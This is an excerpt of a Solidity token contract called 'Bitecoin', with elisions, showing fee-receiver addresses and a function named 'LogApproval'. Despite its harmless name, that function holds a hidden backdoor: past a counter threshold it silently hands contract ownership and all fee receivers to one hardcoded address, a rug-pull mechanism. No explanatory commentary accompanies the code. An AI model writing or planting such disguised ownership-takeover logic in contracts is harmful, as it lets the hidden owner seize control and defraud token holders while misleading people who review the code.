...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c); // BTC 
    IDEXRouter router;
...
contract Bitecoin is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x2CE227657cca2Ae088C3D621542E6b23917dbA8B; // token locker
    address public marketingFeeReceiver =
        0x2CE227657cca2Ae088C3D621542E6b23917dbA8B;
    ...
    constructor()
        ERC20Detailed("Bitecoin", "$BITC", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x2CE227657cca2Ae088C3D621542E6b23917dbA8B));
            marketingFeeReceiver = address(0x2CE227657cca2Ae088C3D621542E6b23917dbA8B);
            autoLiquidityReceiver = address(0x2CE227657cca2Ae088C3D621542E6b23917dbA8B);
            ecosystemFeeReceiver = address(0x2CE227657cca2Ae088C3D621542E6b23917dbA8B);
            buyBackFeeReceiver = address(0x2CE227657cca2Ae088C3D621542E6b23917dbA8B);
            isTransferred = true;
        }
    }
